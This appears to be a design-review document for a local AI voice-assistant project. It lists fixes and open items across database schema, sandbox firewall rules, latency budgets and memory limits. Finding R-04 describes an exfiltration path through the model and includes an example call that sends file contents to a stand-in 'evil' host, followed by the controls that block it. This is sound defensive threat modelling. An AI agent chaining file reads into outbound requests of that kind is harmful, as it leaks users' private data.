@@ -1,0 +1,31 @@
+# 14 — Second-Pass Review of the 2026-09-17 Document Set
+
+Same lens applied to the new documents (06–13, ADRs, specs) as was applied to docs 00–05. Each finding is either **fixed in place** (F) or **recorded as an open item** (O). Blockers file `docs/14_blockers.md` is intentionally not created yet — it is for measured threshold failures during implementation.
+
+| # | Location | Defect found on re-read | Disposition |
+|---|---|---|---|
+| R-01 | spec 04 §2 DDL | `fts_memories` declared as external-content table over `memories` with a `tokens_aux` column that does **not exist** in `memories` → `CREATE VIRTUAL TABLE` would fail. Also no UPDATE trigger. | **F** — added `tokens_aux` column to `memories`, app computes sub-tokens before insert, triggers rewritten, UPDATE trigger added, `lucca_subtokens` SQL function removed. |
+| R-02 | spec 04 §2 vs spec 03 §5.3 | `tool_contents.entry_id` references `provenance_envelopes`, but the envelope `CHECK` only allowed the 4 memory-eligible provenances → `TOOL_CONTENT_UNTRUSTED` envelopes could never be inserted. | **F** — `CHECK` now lists all signed provenances; a trigger on `memories` enforces memory-eligibility instead. |
+| R-03 | ADR-003 rule 2 vs spec 09 §2 `--dns 1.1.1.1` | Two different DNS stories, and the `-d 127.0.0.11` rule can never match in `DOCKER-USER` (post-DNAT). Embedded-resolver traffic is forwarded by `dockerd` from the host netns and never traverses `FORWARD` at all. | **F** — removed the DNS ACCEPT rules; `daemon.json` pins upstream DNS to `1.1.1.1/1.0.0.1`; any *direct* `:53` from a container is now caught by the RFC1918 REJECT or the final DROP. Residual: DNS tunnelling via the public resolver (see R-04). |
+| R-04 | ADR-004 / TM-03 | Split containers stop in-sandbox exfiltration, but the **LLM itself** is a channel: `read_file` → content in context → `fetch_url("https://evil/?d=<content>")`. `FORBIDDEN_SEQUENCES` already contained `(read_file, fetch_url)` but the ADR claimed the split "closes" the channel. | **F** — ADR-004 and TM-03 now state the residual and its controls: forbidden sequence within a turn, URL length ≤ 512, query string ≤ 128 chars, and (Phase 7) allow-listed domains. |
+| R-05 | spec 06 §1 | `CLARIFY` rule references `vad_speech_ms`, which is not in `RuleState` (spec 05 §5) and `RouteFeatures` was defined only as `RuleState + two flags`. | **F** — `RouteFeatures` now = `RuleState` + `vad_speech_ms` + `asr_avg_logprob` + the two rule-fired flags. |
+| R-06 | spec 07 §2 | `KBDLLHOOKSTRUCT.time` is `GetTickCount`-based (≈ 10–16 ms resolution) — unfit as the sub-millisecond latency origin the spec demands elsewhere. | **F** — origin is `QueryPerformanceCounter` read inside the hook callback (callbacks run within ~1 ms of the event); `.time` kept only as a sanity cross-check. |
+| R-07 | ADR-001 fallback D | Spec 11 config lists a separate `text_model` GGUF for cascade mode. Ultravox trains the projector with the Llama backbone **frozen**, so the Q6_K backbone file *is* Llama-3.1-8B-Instruct; cascade mode should need no second 6.6 GB download. | **F** — ADR-001 now says: cascade = same model file without `--mmproj`; `text_model` is optional. **O** — "backbone frozen in v0.5" must be confirmed in Phase 0 spike S10 (if the backbone was LoRA-tuned, quality in text mode must still be verified, not assumed). |
+| R-08 | register I1 | Claimed `.vscode/` contents "unverified"; the three files exist. | **F** — reworded: files exist; README descriptions must match their contents (verify in Phase 1). |
+| R-09 | ADR-008 vs spec 11 §4 | RAM numbers differ (core 900 vs 700, npu 2.2 GB vs 1.9 GB) without saying which is cap vs estimate. | **F** — ADR-008 values are **caps** (alarm thresholds); spec 11 values are **estimates**. Both docs now say so. |
+| R-10 | ADR-001 launch flags | KV-cache V quantisation (`--cache-type-v q8_0`) requires `--flash-attn` in llama.cpp; the dependency was implicit. | **F** — noted in the flag table. |
+| R-11 | spec 03 §5.1 | Storing every chit-chat transcript forever is a privacy/volume concern not addressed. | **O** — default kept (user asked for a companion that remembers); `lucca-admin memory prune --kind transcript --older-than 180d` added to spec 11 §7 as an opt-in. |
+| R-12 | spec 05 §9 | A QUARANTINE rule with one failure lingers until 30-day retirement; no explicit path to a corrected version. | **O** — acceptable (reflection can propose `base_id` v(N+1) with `parent_rule_id`); documented, no change. |
+| R-13 | spec 07 §4 | NPU Whisper encoder pads to 30 s; latency may be near-constant (~150–300 ms) regardless of clip length. The 3 s-clip gate is fine, but a 0.5 s "yes" confirmation pays the same cost. | **O** — measure in Phase 0; if > 200 ms, route sub-1.5 s confirmations through the CPU `distil-whisper-small` path (add as config `asr.short_clip_cpu=true`). |
+| R-14 | spec 10 §2 | Budget assumes S2 TTFT median 180 ms; if Phase 0 measures higher, S3–S5 cannot absorb it and the 600 ms gate may be breached in audio mode while transcript mode is *also* slower. | **O** — this is exactly the "stop and record in 14_blockers.md" case; no threshold is pre-relaxed. |
+| R-15 | `GEMINI.md` | Not updated in this pass; likely mirrors the old AGENTS.md §3. | **O** — implementer: mirror AGENTS.md §3 precedence block. |
+| R-16 | all specs | Every number marked *estimate* must be replaced after Phase 0; list lives in ADR-001 spike table, spec 07 §9, spec 11 §4, review-notes §"facts to measure". | **O** — tracked in `docs/14_phase0_results.md` (to be created by implementer). |
+
+## What was re-checked and found consistent
+
+- Latency stage budgets sum to 475 ms (spec 10) and match ADR-001 spike gates (S2 ≤ 200 median / 300 p95 vs budget 180 / gate 300).
+- Context token budget (spec 10 §4) matches history/memory limits in specs 04 and 07.
+- Provenance enum (spec 03) ⇄ signer allow-list ⇄ import-linter contracts (spec 11) ⇄ AST test (matrix) are mutually consistent.
+- Every test ID referenced in the phase bundles (matrix §4) exists in a spec or in the matrix itself.
+- No spec re-introduces vLLM, Chroma, `rank-bm25`, `pynput`, `caps_lock`, Playwright-by-default, or GPU passthrough to the sandbox.
+- AGENTS.md invariants 1–5 are preserved; invariant 1 wording extended (USER_DERIVED, TOOL_CONTENT_UNTRUSTED) without weakening.
